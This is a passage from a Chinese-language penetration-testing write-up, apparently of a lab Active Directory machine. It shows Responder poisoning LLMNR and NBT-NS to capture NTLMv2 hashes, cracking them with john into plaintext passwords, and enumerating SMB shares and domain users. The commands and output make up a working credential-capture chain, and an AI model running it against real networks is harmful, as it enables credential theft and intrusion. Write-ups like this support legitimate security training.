    HTTPS server               <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    WPAD proxy                 <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Auth proxy                 <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    SMB server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    Kerberos server            <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    SQL server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    FTP server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    IMAP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    POP3 server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    SMTP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DNS server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    LDAP server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    MQTT server                <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    RDP server                 <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    DCE-RPC server             <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    WinRM server               <span class="token punctuation">[</span>ON<span class="token punctuation">]</span>
    SNMP server                <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> HTTP Options:
    Always serving EXE         <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Serving EXE                <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Serving HTML               <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Upstream Proxy             <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Poisoning Options:
    Analyze Mode               <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force WPAD auth            <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force Basic Auth           <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force LM downgrade         <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>
    Force ESS downgrade        <span class="token punctuation">[</span>OFF<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generic Options:
    Responder NIC              <span class="token punctuation">[</span>eth0<span class="token punctuation">]</span>
    Responder IP               <span class="token punctuation">[</span><span class="token number">192.168</span>.31.34<span class="token punctuation">]</span>
    Responder IPv6             <span class="token punctuation">[</span>fe80::20c:29ff:fed2:e049<span class="token punctuation">]</span>
    Challenge <span class="token builtin class-name">set</span>              <span class="token punctuation">[</span>random<span class="token punctuation">]</span>
    Don<span class="token string">'t Respond To Names     ['</span>ISATAP<span class="token string">', '</span>ISATAP.LOCAL'<span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Current Session Variables:
    Responder Machine Name     <span class="token punctuation">[</span>WIN-DAIMRNTG9AQ<span class="token punctuation">]</span>
    Responder Domain Name      <span class="token punctuation">[</span>TMNN.LOCAL<span class="token punctuation">]</span>
    Responder DCE-RPC Port     <span class="token punctuation">[</span><span class="token number">48974</span><span class="token punctuation">]</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Listening <span class="token keyword">for</span> events<span class="token punctuation">..</span>.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::a065:ce99:e0f0:a666 <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::1c00:56bb:d1dc:54fd <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.207 <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::a065:ce99:e0f0:a666 <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.207 <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.56.116 <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::1c00:56bb:d1dc:54fd <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::a065:ce99:e0f0:a666 <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.207 <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.56.116 <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::1c00:56bb:d1dc:54fd <span class="token keyword">for</span> name WIN-C73PROQLRHL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.207 <span class="token keyword">for</span> name SQLSERVER <span class="token punctuation">(</span>service: File Server<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::a065:ce99:e0f0:a666 <span class="token keyword">for</span> name SQLserver
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.207 <span class="token keyword">for</span> name SQLserver
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::1c00:56bb:d1dc:54fd <span class="token keyword">for</span> name SQLserver
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::a065:ce99:e0f0:a666 <span class="token keyword">for</span> name SQLserver
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.56.116 <span class="token keyword">for</span> name SQLserver
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.207 <span class="token keyword">for</span> name SQLserver
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::1c00:56bb:d1dc:54fd <span class="token keyword">for</span> name SQLserver
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.56.116 <span class="token keyword">for</span> name SQLserver
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Client   <span class="token builtin class-name">:</span> fe80::a065:ce99:e0f0:a666
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Username <span class="token builtin class-name">:</span> cons<span class="token punctuation">\</span>Appolonia
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Hash     <span class="token builtin class-name">:</span> Appolonia::cons:13b4be34297674c8:4F44709CF3B6818CB57115CEFCC0E162:01010000000000000078A195A145DB01D060FB45C7F491F1000000000200080054004D004E004E0001001E00570049004E002D004400410049004D0052004E005400470039004100510004003400570049004E002D004400410049004D0052004E00540047003900410051002E0054004D004E004E002E004C004F00430041004C000300140054004D004E004E002E004C004F00430041004C000500140054004D004E004E002E004C004F00430041004C00070008000078A195A145DB01060004000200000008003000300000000000000000000000004000006E691A471561EA9CD8EE3E73EB57E15A9D8B7FB342D4346AD23EDDF99AFE428D0A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>NBT-NS<span class="token punctuation">]</span> Poisoned answer sent to <span class="token number">192.168</span>.31.207 <span class="token keyword">for</span> name SQLDATABABASE <span class="token punctuation">(</span>service: File Server<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::1c00:56bb:d1dc:54fd <span class="token keyword">for</span> name SQLDatababase
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::a065:ce99:e0f0:a666 <span class="token keyword">for</span> name SQLDatababase
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.207 <span class="token keyword">for</span> name SQLDatababase
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.56.116 <span class="token keyword">for</span> name SQLDatababase
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::a065:ce99:e0f0:a666 <span class="token keyword">for</span> name SQLDatababase
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.31.207 <span class="token keyword">for</span> name SQLDatababase
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to fe80::1c00:56bb:d1dc:54fd <span class="token keyword">for</span> name SQLDatababase
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token punctuation">[</span>LLMNR<span class="token punctuation">]</span>  Poisoned answer sent to <span class="token number">192.168</span>.56.116 <span class="token keyword">for</span> name SQLDatababase
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Client   <span class="token builtin class-name">:</span> fe80::a065:ce99:e0f0:a666
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Username <span class="token builtin class-name">:</span> cons<span class="token punctuation">\</span>sqldb
<span class="token punctuation">[</span>SMB<span class="token punctuation">]</span> NTLMv2-SSP Hash     <span class="token builtin class-name">:</span> sqldb::cons:e9c0b9bff0c82b7d:BFFA504C3851F0A0B0A60FB5079AE3C8:01010000000000000078A195A145DB0161767E1C085524BA000000000200080054004D004E004E0001001E00570049004E002D004400410049004D0052004E005400470039004100510004003400570049004E002D004400410049004D0052004E00540047003900410051002E0054004D004E004E002E004C004F00430041004C000300140054004D004E004E002E004C004F00430041004C000500140054004D004E004E002E004C004F00430041004C00070008000078A195A145DB01060004000200000008003000300000000000000000000000004000006E691A471561EA9CD8EE3E73EB57E15A9D8B7FB342D4346AD23EDDF99AFE428D0A001000000000000000000000000000000000000900240063006900660073002F00530051004C004400610074006100620061006200610073006500000000000000000000000000</code></pre>
<p>抓到了两个用户哈希，一个是Appolonia，另一个是sqldb的<br>爆破一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  john Appolonia.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/seclists/Passwords/seasons.txt
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>netntlmv2, NTLMv2 C/R <span class="token punctuation">[</span>MD4 HMAC-MD5 <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: invalid UTF-8 seen reading ~/.john/john.pot
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
5umm3r@          <span class="token punctuation">(</span>Appolonia<span class="token punctuation">)</span>
root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  john sqldb.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/seclists/Passwords/seasons.txt       
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>netntlmv2, NTLMv2 C/R <span class="token punctuation">[</span>MD4 HMAC-MD5 <span class="token number">32</span>/64<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: invalid UTF-8 seen reading ~/.john/john.pot
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
au7umn@          <span class="token punctuation">(</span>sqldb<span class="token punctuation">)</span></code></pre>
<p>Appolonia:5umm3r@<br>sqldb:au7umn@</p>
<p>列一下共享文件夹</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  smbmap <span class="token parameter variable">-u</span> <span class="token string">'sqldb'</span> <span class="token parameter variable">-p</span>  <span class="token string">'au7umn@'</span> <span class="token parameter variable">-H</span> <span class="token number">192.168</span>.31.207                   <span class="token punctuation">[</span><span class="token number">16</span>:42:54<span class="token punctuation">]</span>

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com<span class="token operator">&lt;</span>mailto:ShawnDEvans@gmail.com<span class="token operator">></span>
                     https://github.com/ShawnDEvans/smbmap

<span class="token punctuation">[</span><span class="token punctuation">\</span><span class="token punctuation">]</span> Checking <span class="token keyword">for</span> <span class="token function">open</span> ports<span class="token punctuation">..</span>.                                                                      <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">1</span> SMB connections<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and <span class="token number">1</span> authenticated session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">|</span><span class="token punctuation">]</span> Enumerating shares<span class="token punctuation">..</span>.                                                                           <span class="token punctuation">[</span>/<span class="token punctuation">]</span> Enumerating shares<span class="token punctuation">..</span>.                                                                                                                                                                               
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">192.168</span>.31.207:445      Name: cons.thl                  Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Closing connections<span class="token punctuation">..</span>                                                                           <span class="token punctuation">[</span><span class="token punctuation">\</span><span class="token punctuation">]</span> Closing connections<span class="token punctuation">..</span>                                                                           <span class="token punctuation">[</span><span class="token operator">|</span><span class="token punctuation">]</span> Closing connections<span class="token punctuation">..</span>                                                                           <span class="token punctuation">[</span>/<span class="token punctuation">]</span> Closing connections<span class="token punctuation">..</span>                                                                           <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Closing connections<span class="token punctuation">..</span>                                                                           <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Closed <span class="token number">1</span> connections</code></pre>
<p>翻了一下几个可读目录，没什么有用的信息,Appolonia也看了，同样没有东西</p>
<h2 id="lookupsid"><a href="#lookupsid" class="headerlink" title="lookupsid"></a>lookupsid</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  lookupsid.py sqldb@192.168.31.207                                   <span class="token punctuation">[</span><span class="token number">16</span>:50:04<span class="token punctuation">]</span>
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

Password:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Brute forcing SIDs at <span class="token number">192.168</span>.31.207
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> StringBinding ncacn_np:192.168.31.207<span class="token punctuation">[</span><span class="token punctuation">\</span>pipe<span class="token punctuation">\</span>lsarpc<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Domain SID is: S-1-5-21-2838722739-4169515792-1136184259
<span class="token number">498</span>: CONS<span class="token punctuation">\</span>Enterprise Read-only Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">500</span>: CONS<span class="token punctuation">\</span>Administrator <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">501</span>: CONS<span class="token punctuation">\</span>Guest <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">502</span>: CONS<span class="token punctuation">\</span>krbtgt <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">503</span>: CONS<span class="token punctuation">\</span>DefaultAccount <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">512</span>: CONS<span class="token punctuation">\</span>Domain Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">513</span>: CONS<span class="token punctuation">\</span>Domain Users <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">514</span>: CONS<span class="token punctuation">\</span>Domain Guests <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">515</span>: CONS<span class="token punctuation">\</span>Domain Computers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">516</span>: CONS<span class="token punctuation">\</span>Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">517</span>: CONS<span class="token punctuation">\</span>Cert Publishers <span class="token punctuation">(</span>SidTypeAlias<span class="token punctuation">)</span>
<span class="token number">518</span>: CONS<span class="token punctuation">\</span>Schema Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">519</span>: CONS<span class="token punctuation">\</span>Enterprise Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">520</span>: CONS<span class="token punctuation">\</span>Group Policy Creator Owners <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">521</span>: CONS<span class="token punctuation">\</span>Read-only Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">522</span>: CONS<span class="token punctuation">\</span>Cloneable Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">525</span>: CONS<span class="token punctuation">\</span>Protected Users <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">526</span>: CONS<span class="token punctuation">\</span>Key Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">527</span>: CONS<span class="token punctuation">\</span>Enterprise Key Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">553</span>: CONS<span class="token punctuation">\</span>RAS and IAS Servers <span class="token punctuation">(</span>SidTypeAlias<span class="token punctuation">)</span>
<span class="token number">571</span>: CONS<span class="token punctuation">\</span>Allowed RODC Password Replication Group <span class="token punctuation">(</span>SidTypeAlias<span class="token punctuation">)</span>
<span class="token number">572</span>: CONS<span class="token punctuation">\</span>Denied RODC Password Replication Group <span class="token punctuation">(</span>SidTypeAlias<span class="token punctuation">)</span>
<span class="token number">1000</span>: CONS<span class="token punctuation">\</span>WIN-C73PROQLRHL$ <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1101</span>: CONS<span class="token punctuation">\</span>DnsAdmins <span class="token punctuation">(</span>SidTypeAlias<span class="token punctuation">)</span>
<span class="token number">1102</span>: CONS<span class="token punctuation">\</span>DnsUpdateProxy <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">1103</span>: CONS<span class="token punctuation">\</span>SQLServer2005SQLBrowserUser<span class="token variable">$WIN</span>-C73PROQLRHL <span class="token punctuation">(</span>SidTypeAlias<span class="token punctuation">)</span>
<span class="token number">1104</span>: CONS<span class="token punctuation">\</span>sqlsvc <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1105</span>: CONS<span class="token punctuation">\</span>jwats <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1445</span>: CONS<span class="token punctuation">\</span>appolonia <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1446</span>: CONS<span class="token punctuation">\</span>april <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1447</span>: CONS<span class="token punctuation">\</span>aprilette <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1448</span>: CONS<span class="token punctuation">\</span>ara <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1449</span>: CONS<span class="token punctuation">\</span>arabel <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1450</span>: CONS<span class="token punctuation">\</span>arabela <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1451</span>: CONS<span class="token punctuation">\</span>arabele <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1452</span>: CONS<span class="token punctuation">\</span>arabella <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1453</span>: CONS<span class="token punctuation">\</span>arabelle <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1454</span>: CONS<span class="token punctuation">\</span>arda <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1455</span>: CONS<span class="token punctuation">\</span>ardath <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1456</span>: CONS<span class="token punctuation">\</span>ardeen <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1457</span>: CONS<span class="token punctuation">\</span>ardelia <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1458</span>: CONS<span class="token punctuation">\</span>ardelis <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1459</span>: CONS<span class="token punctuation">\</span>ardella <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1460</span>: CONS<span class="token punctuation">\</span>ardelle <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1461</span>: CONS<span class="token punctuation">\</span>arden <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1462</span>: CONS<span class="token punctuation">\</span>ardene <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1463</span>: CONS<span class="token punctuation">\</span>ardenia <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1464</span>: CONS<span class="token punctuation">\</span>ardine <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1465</span>: CONS<span class="token punctuation">\</span>ardis <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1466</span>: CONS<span class="token punctuation">\</span>ardisj <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1467</span>: CONS<span class="token punctuation">\</span>ardith <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1468</span>: CONS<span class="token punctuation">\</span>ardra <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1469</span>: CONS<span class="token punctuation">\</span>ardyce <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1470</span>: CONS<span class="token punctuation">\</span>ardys <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1471</span>: CONS<span class="token punctuation">\</span>ardyth <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1472</span>: CONS<span class="token punctuation">\</span>aretha <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1473</span>: CONS<span class="token punctuation">\</span>ariadne <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1474</span>: CONS<span class="token punctuation">\</span>ariana <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1475</span>: CONS<span class="token punctuation">\</span>aridatha <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1476</span>: CONS<span class="token punctuation">\</span>ariel <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1477</span>: CONS<span class="token punctuation">\</span>ariela <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1478</span>: CONS<span class="token punctuation">\</span>ariella <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1479</span>: CONS<span class="token punctuation">\</span>arielle <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1480</span>: CONS<span class="token punctuation">\</span>arlana <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1481</span>: CONS<span class="token punctuation">\</span>arlee <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1482</span>: CONS<span class="token punctuation">\</span>arleen <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1483</span>: CONS<span class="token punctuation">\</span>arlen <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1484</span>: CONS<span class="token punctuation">\</span>arlena <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1485</span>: CONS<span class="token punctuation">\</span>arlene <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1486</span>: CONS<span class="token punctuation">\</span>arleta <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1487</span>: CONS<span class="token punctuation">\</span>arlette <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1488</span>: CONS<span class="token punctuation">\</span>arleyne <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1489</span>: CONS<span class="token punctuation">\</span>arlie <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">1490</span>: CONS<span class="token punctuation">\</span>arliene <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
